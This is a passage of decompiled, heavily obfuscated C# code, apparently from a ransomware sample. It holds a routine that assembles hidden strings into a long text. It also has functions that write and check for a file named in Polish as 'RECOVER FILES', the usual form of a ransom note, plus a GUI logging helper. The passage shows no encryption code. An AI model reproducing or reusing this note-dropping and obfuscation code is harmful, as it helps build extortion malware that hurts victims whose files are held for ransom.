					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2324));
					num = 25;
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto case 22;
					}
					goto IL_0283;
				case 22:
					stringBuilder.AppendLine("");
					num3 = 19;
					goto IL_027f;
				case 9:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2328));
					num = 17;
					goto IL_0283;
				case 16:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2352));
					num2 = 4;
					continue;
				case 2:
					stringBuilder.AppendLine("");
					num = 22;
					if (false)
					{
						goto case 28;
					}
					goto IL_0283;
				case 28:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num = 21;
					if (false)
					{
						goto case 1;
					}
					goto IL_0283;
				case 1:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num2 = 3;
					continue;
				case 14:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2296));
					num3 = 23;
					goto IL_027f;
				case 11:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2348));
					num3 = 20;
					goto IL_027f;
				case 33:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2276));
					num = 15;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						goto case 25;
					}
					goto IL_0283;
				case 25:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num2 = 6;
					continue;
				case 35:
					stringBuilder.AppendLine("");
					num = 13;
					if (1 == 0)
					{
						goto case 30;
					}
					goto IL_0283;
				case 30:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091();
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						num = 8;
						if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto case 36;
						}
					}
					else
					{
						num = 27;
						if (false)
						{
							goto case 13;
						}
					}
					goto IL_0283;
				case 20:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2292));
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num = 16;
					if (false)
					{
						goto case 26;
					}
					goto IL_0283;
				case 26:
					stringBuilder.AppendLine("");
					goto case 18;
				default:
					num = 18;
					goto IL_0283;
				case 17:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2332));
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2336));
					num2 = 1;
					continue;
				case 32:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2308));
					num3 = 26;
					goto IL_027f;
				case 36:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2268));
					num3 = 10;
					goto IL_027f;
				case 6:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2292));
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num2 = 9;
					continue;
				case 3:
					goto IL_03d6;
				case 5:
					goto IL_040b;
				case 23:
					goto IL_042f;
				case 19:
				case 31:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2316));
					num2 = 24;
					continue;
				case 29:
					result = stringBuilder.ToString();
					num = 37;
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto case 28;
					}
					goto IL_0283;
				case 21:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2292));
					goto case 12;
				case 13:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num = 28;
					goto IL_0283;
				case 34:
					goto IL_04da;
				case 12:
				case 27:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
					num = 14;
					if (true)
					{
						goto IL_0283;
					}
					goto case 10;
				case 10:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2272));
					num2 = 33;
					continue;
				case 15:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2280));
					num3 = 30;
					goto IL_027f;
				case 18:
					stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2312));
					num = 2;
					if (true)
					{
						goto IL_0283;
					}
					goto case 37;
				case 37:
					{
						return result;
					}
					IL_027f:
					num = num3;
					goto IL_0283;
				}
				break;
				IL_04da:
				if (!_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(116))
				{
					stringBuilder = new StringBuilder();
					num2 = 36;
				}
				else
				{
					num2 = 31;
				}
			}
			goto IL_001a;
			IL_005a:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
			num = 29;
			if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
			{
				goto IL_0283;
			}
			goto IL_03d6;
			IL_003a:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2288));
			num = 35;
			if (1 == 0)
			{
				goto IL_005a;
			}
			goto IL_0283;
			IL_001a:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2284));
			num = 0;
			if (false)
			{
				goto IL_003a;
			}
			goto IL_0283;
			IL_042f:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2300));
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2304));
			num2 = 5;
			goto IL_0287;
			IL_040b:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2300));
			num = 32;
			if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_0283;
			}
			goto IL_042f;
			IL_03d6:
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2340));
			stringBuilder.AppendLine(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2344));
			num = 11;
			if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_0283;
			}
			goto IL_040b;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void WriteStatusFile(string _0020, string _0020, string _0020, DateTime _0020, string _0020 = "!!$ O D Z Y S K A J   P L I K I.txt")
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		try
		{
			string arg = _0020.ToString(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2252));
			File.WriteAllText(Path.Combine(_0020, _0020), StaticText + string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2356), _0020, _0020, arg));
		}
		catch
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static bool StatusFileExist(string _0020, string _0020 = "!!$ O D Z Y S K A J   P L I K I.txt")
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return File.Exists(Path.Combine(_0020, _0020));
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
public static class _008E_0089_0087_008A_0086_008A_0088_008D_0094_008F_0088_0091_008F_008B_008F_0093_008E_008A_0095_0095_008D_0087_0089_008F_008D_008A_008E_0091_008A_0093_0093_0095_0090_008E_0089_008A
{
	private static TextBox LogViewer
	{
		[MethodImpl(MethodImplOptions.NoInlining)]
		get;
		[MethodImpl(MethodImplOptions.NoInlining)]
		set;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void SetLogViewer(this Form _0020, TextBox _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0040
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 3;
		bool flag = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				switch (num2)
				{
				case 3:
					flag = _0020 == null;
					_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto IL_0026;
					}
					num = 0;
					break;
				case 1:
				case 4:
					if (flag)
					{
						goto default;
					}
					LogViewer = _0020;
					num = 5;
					break;
				default:
					throw new NullReferenceException(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2360));
				case 5:
					return;
				}
				break;
				IL_0026:
				num2 = 4;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(string.Empty, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(string _0020, string _0020, Exception _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, _0020));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(this Form _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(string.Empty, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(this Form _0020, string _0020, string _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, null));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public static void Log(this Form _0020, string _0020, string _0020, Exception _0020)
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		AppendMessage(FormatMessage(_0020, _0020, _0020));
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static void AppendMessage(string _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0099
		//IL_0006: Incompatible stack heights: 0 vs 1
		int num = 0;
		_003C_003Ec__DisplayClass11_0 _003C_003Ec__DisplayClass11_ = default(_003C_003Ec__DisplayClass11_0);
		bool invokeRequired = default(bool);
		bool flag = default(bool);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3;
				switch (num2)
				{
				case 5:
					((Control)LogViewer).Invoke((Delegate)new Action(_003C_003Ec__DisplayClass11_._003CAppendMessage_003Eb__0));
					num2 = 11;
					continue;
				case 1:
				case 9:
					((TextBoxBase)LogViewer).ScrollToCaret();
					num3 = 12;
					goto IL_009e;
				case 8:
					_003C_003Ec__DisplayClass11_.message = _0020;
					_ = 1;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						num2 = 7;
						continue;
					}
					num = 1;
					if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						break;
					}
					goto case 0;
				case 10:
					throw new NullReferenceException(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2364));
				case 3:
				{
					if (invokeRequired)
					{
						goto case 5;
					}
					TextBox logViewer = LogViewer;
					((Control)logViewer).set_Text(((Control)logViewer).get_Text() + _003C_003Ec__DisplayClass11_.message);
					num = 6;
					if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						break;
					}
					goto case 6;
				}
				default:
					num = 5;
					if (false)
					{
						return;
					}
					break;
				case 11:
					return;
				case 6:
					((TextBoxBase)LogViewer).set_SelectionStart(((Control)LogViewer).get_Text().Length);
					goto case 1;
				case 0:
					_003C_003Ec__DisplayClass11_ = new _003C_003Ec__DisplayClass11_0();
					num = 8;
					break;
				case 2:
				case 7:
					flag = LogViewer == null;
					num3 = 4;
					goto IL_009e;
				case 4:
					if (!flag)
					{
						invokeRequired = ((Control)LogViewer).get_InvokeRequired();
						num3 = 3;
						goto IL_009e;
					}
					num2 = 10;
					continue;
				case 12:
					return;
					IL_009e:
					num = num3;
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private static string FormatMessage(string _0020, string _0020, Exception _0020)
	{
		//Discarded unreachable code: IL_0005, IL_00b0
		//IL_0006: Incompatible stack heights: 0 vs 1
		_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092();
		int num;
		if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
		{
			num = 4;
			goto IL_00bd;
		}
		int num2 = 3;
		goto IL_00b5;
		IL_00b9:
		int num3;
		num = num3;
		goto IL_00bd;
		IL_00bd:
		bool flag = default(bool);
		string result = default(string);
		while (true)
		{
			switch (num)
			{
			case 0:
			case 4:
				flag = !string.IsNullOrEmpty(_0020);
				goto case 1;
			case 2:
				result = string.Format(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2376), DateTime.Now, _0020.ToUpper(), _0020, _0020);
				num3 = 6;
				if (false)
				{
					goto case 1;
				}
				goto IL_00b9;
			case 1:
			case 3:
				if (flag)
				{
					goto end_IL_00bd;
				}
				goto case 2;
			case 5:
				_0020 = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2368) + _0020 + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(2372);
				goto case 2;
			default:
				num = 2;
				break;
			case 6:
				return result;
			}
			continue;
			end_IL_00bd:
			break;
		}
		num2 = 5;
		goto IL_00b5;
		IL_00b5:
		num3 = num2;
		goto IL_00b9;
	}

	internal static bool _0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return true;
	}

	internal static bool _008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()
	{
		//Discarded unreachable code: IL_0005
		//IL_0006: Incompatible stack heights: 0 vs 1
		return false;
	}
}
